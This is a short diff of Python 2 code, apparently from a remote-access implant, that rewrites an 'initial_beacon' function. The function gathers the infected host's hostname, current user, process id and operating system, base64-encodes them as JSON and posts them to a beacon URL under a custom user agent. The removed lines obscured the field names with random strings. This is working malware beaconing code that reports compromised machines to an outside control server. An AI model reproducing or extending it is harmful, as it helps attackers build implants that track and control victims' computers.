@@ -44,22 +44,16 @@ def crypt(key, data):
 
 def initial_beacon(hostname, current_user, process_id, operating_system):
     try:
-        hostname_var = "".join(random.choice(string.lowercase) for i in range(10))
-        current_user_var = "".join(random.choice(string.lowercase) for i in range(10))
-        process_id_var = "".join(random.choice(string.lowercase) for i in range(10))
-        operating_system_var = "".join(random.choice(string.lowercase) for i in range(10))
+        post_data = {
+            "h": hostname,
+            "u": current_user,
+            "p": process_id,
+            "o": operating_system
+        }
 
-        post_data = [
-            (hostname_var, hostname),
-            (current_user_var, current_user),
-            (process_id_var, process_id),
-            (operating_system_var, operating_system)
-        ]
-
-        base64_post_data = base64.b64encode(urllib.urlencode(post_data))
-
-        request = urllib2.Request(beacon_url, base64_post_data)
+        request = urllib2.Request(beacon_url, data=base64.b64encode(json.dumps(post_data)))
         request.add_header("User-Agent", user_agent)
+        request.add_header("Content-Type", "application/json")
         f = urllib2.urlopen(request)
         response = f.read()
         return response
